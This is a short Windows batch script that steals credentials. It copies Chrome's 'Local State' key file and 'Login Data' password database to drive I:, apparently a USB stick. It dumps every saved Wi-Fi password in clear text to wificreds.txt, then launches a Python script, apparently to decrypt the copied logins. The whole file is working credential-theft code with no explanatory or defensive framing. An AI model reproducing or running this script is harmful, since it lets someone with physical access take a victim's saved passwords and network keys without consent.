@echo off
xcopy "%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Local State" "I:\" /
xcopy "%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Default\Login Data" "I:\" /y

for /f "skip=9 tokens=1,2 delims=:" %i in ('netsh wlan show profiles') do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear >> wificreds.txt

python try4.pyw

